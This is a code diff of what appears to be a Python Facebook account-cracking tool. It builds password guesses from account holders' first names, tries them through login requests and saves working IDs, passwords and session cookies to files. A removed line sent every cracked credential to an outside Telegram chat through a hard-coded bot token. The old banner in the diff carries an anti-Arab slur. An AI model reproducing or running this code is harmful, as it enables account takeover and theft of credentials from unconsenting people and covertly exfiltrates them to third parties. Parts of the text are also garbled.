@@ -1,3 +1,33 @@
+import os
+import sys
+import time
+import requests,bs4,json,os,sys,random,datetime,time,re
+from datetime import *
+def stoped(y=0,m=0,d=0):
+ date = datetime.now()
+ if len(list(str(y))) == 4:
+  if m <= 11 and m > 0:
+   if d <= 6 and d > 0:
+    if date.year <= y:
+     if date.month <= m:
+      if date.day < d:
+       return True
+x = stoped(2024,3,16)
+os.system('xdg-open  https://t.me/KILLER_CRACKeER')
+if x:pass
+else:quit('This tool hass ben expired')
+os.system('https://t.me/KILLER_CRACKeER')
+print("TOLL WORKING @l4m_rawa")
+import os
+try:
+	import requests
+except ImportError:
+	os.system("pip install requests")
+
+try:
+	import concurrent.futures
+except ImportError:
+	os.system("pip install futures")
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from rich.table import Table as me
@@ -254,16 +284,14 @@ def animation(u):
 #------------------[ LOGO-HAMA ]-----------------#
 logo =""" 
 \x1b[32m
-       °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
-      >    ➥  ŴELCOME MY TOOL ≺RAWA≻<
-      °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
-      VERSION 2.5🇩🇪
-      RECORD WOOLD M416 LIVL 5🐒
-      SEE AM VESRSIONA BKA ENJA SAERY KA
-      VESRION COOMING ZOON🐺
-      FILE VIP OK DENET🐆
-      PASSWORD TOOL 21 SLOW BEST🐌
-      fuck you arabic🐊
+    ██████   █████  ██     ██  █████  
+██   ██ ██   ██ ██     ██ ██   ██ 
+██████  ███████ ██  █  ██ ███████ 
+██   ██ ██   ██ ██ ███ ██ ██   ██ 
+██   ██ ██   ██  ███ ███  ██   ██
+
+𝐕𝐄𝐒𝐈𝐎𝐍 𝟐.𝟓🔥
+
      
           
    
@@ -271,7 +299,7 @@ logo ="""
           [1;30m"""
 os.system('clear')
 print(logo)
-uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
+uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m 𝐍𝐚𝐦𝐞 \033[1;91m: \33[1;32m')
 pass
 def login():
     try:
@@ -539,9 +567,8 @@ def crack_file():
  
 def setting():
     print('\033[0;92m=============================')
-    print("\033[97;1m[\033[92;1m1\033[97;1m] RAWA😥 \x1b[33m[1\x1b[33m] \x1b[33m[\033[0;92mOLD \x1b[36mID\x1b[33m]")
-    print("\033[97;1m[\033[92;1m2\033[97;1m] RAWA😓 \x1b[33m[2\x1b[33m] \x1b[33m[\033[0;92mNEW \x1b[36mID\x1b[33m]")
-    print("\033[97;1m[\033[92;1m3\033[97;1m] RAWA \x1b[33m[3\x1b[33m] \x1b[33m[\033[0;92m \x1b[36mRANDOM🐾����x1b[33m]")
+    
+    print("\033[97;1m[\033[92;1m3\033[97;1m] 𝐑𝐀𝐖𝐀 \x1b[33m[3\x1b[33m] \x1b[33m[\033[0;92m \x1b[36m𝐑𝐀𝐍𝐃𝐎𝐌🔥x1b[33m]")
     print('\033[0;92m=============================')
     hu = input('\033[97;1m[\033[92;1m+\033[97;1m]HALBZHERA= :\033[92;1m ')
     if hu in ['1','01']:
@@ -565,8 +592,8 @@ def setting():
             xx = random.randint(0,len(id2))
             id2.insert(xx,bacot)
     print('\033[0;92m==================')
-    print("\033[97;1m[\033[92;1m1\033[97;1m] METHOD 1 [UPDATE🦍] \x1b[33m[1\x1b[33m] \x1b[33m[\033[0;92m \x1b[36mMETHOD \x1b[33m]")
-    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD \x1b[33m[2\x1b[33m] \x1b[33m[\033[0;92mSHOW \x1b[36mCP\x1b[33m]")
+    print("\033[97;1m[\033[92;1m1\033[97;1m] 𝐌𝐄𝐓𝐇𝐎𝐃 𝟏  \x1b[33m[1\x1b[33m] \x1b[33m[\033[0;92m \x1b[36mMETHOD \x1b[33m]")
+    
     print('\033[0;92m==================')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] HALBZHERA= : ')
     if hc in ['1','01']:
@@ -602,24 +629,18 @@ def passwrd():
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-                    pwv.append(frs+'qwery')
                     pwv.append(frs+'1998')
                     pwv.append(frs+'2007')
                     pwv.append(frs+'2006')
                     pwv.append(frs+'2005')
                     pwv.append(frs+'2020')
-                    pwv.append(frs+'0000')
-                    pwv.append(frs+'123123')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
                     pwv.append(frs+'1111')
                     pwv.append(frs+'2222')
                     pwv.append(frs+'2000')
                     pwv.append(frs+'2211')
-                    pwv.append(frs+'00')
-                    pwv.append(frs+'19971997')
-                    pwv.append(frs+'1221')
-                    pwv.append(nmf)
+                    
             else:
                 if len(frs)<3:
                     pwv.append(nmf)
@@ -630,23 +651,17 @@ def passwrd():
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-                    pwv.append(frs+'qwery')
                     pwv.append(frs+'1998')
                     pwv.append(frs+'2007')
                     pwv.append(frs+'2006')
                     pwv.append(frs+'2005')
                     pwv.append(frs+'2020')
-                    pwv.append(frs+'0000')
-                    pwv.append(frs+'123123')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
                     pwv.append(frs+'1111')
                     pwv.append(frs+'2222')
                     pwv.append(frs+'2000')
                     pwv.append(frs+'2211')
-                    pwv.append(frs+'00')
-                    pwv.append(frs+'19971997')
-                    pwv.append(frs+'1221')
                     
             if 'ya' in pwpluss:
                 for xpwd in pwnya:
@@ -663,7 +678,7 @@ def passwrd():
             else:
                 pool.submit(crackfree,idf,pwv)
     print('\n\033[1;37m===================================')
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m+\033[97;1m] 𝐊𝐀𝐓𝐄 𝐃𝐀𝐒𝐓 𝐏𝐄 𝐊𝐑𝐃𝐍𝐄 𝐂𝐑𝐀𝐂𝐊 :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
     print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
     print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
     print('\n\033[1;37m===================================')
@@ -676,7 +691,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\x1b[32m{bo}\x1b[33m[VIP-B-API]\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m] \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32mOK\x1b[30m/\x1b[36mCP\x1b[33m]{bo} \x1b[32m{ok} / \x1b[36m{cp} \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]\033[0;36m "),
+    sys.stdout.write(f"\r\x1b[32m{bo}\x1b[33m[𝐑𝐀𝐖𝐀-𝐁-𝐀𝐏𝐈🔥]\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m] \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32m𝐎𝐊\x1b[30m/\x1b[36m𝐂𝐏\x1b[33m]{bo} \x1b[32m{ok} / \x1b[36m{cp} \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]\033[0;36m "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -719,7 +734,7 @@ def crack(idf,pwv):
             if "checkpoint" in po.cookies.get_dict().keys():
                 
                 print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
-                print(f'\r\033[0;93m[\33[1;96mNAKRETAUA[😅]\33[1;93m]  {idf}  {pw} ')
+                print(f'\r\033[0;93m[\33[1;96m𝐂𝐏\33[1;93m]  {idf}  {pw} ')
                 print ('\x1b[36m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -730,8 +745,7 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
-                requests.get(f"https://api.telegram.org/bot6602510569:AAFQ5XG9FhOtXklo9riNScT9eQk4qPzRaio/sendMessage?chat_id=1716814575&text=\r {idf} | {pw}")
-                print(f'\r\33[1;93m[\33[1;92mRAWA-UP-OK💀\33[1;93m] \33[1;92m{idf} {pw} | \n\033[0;92m{kuki} ')
+                print(f'\r\33[1;93m[\33[1;92m𝐑𝐀𝐖𝐀-𝐎𝐊\33[1;93m] \33[1;92m{idf} {pw} | \n\033[0;92m{kuki} ')
                 print ('\x1b[32m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
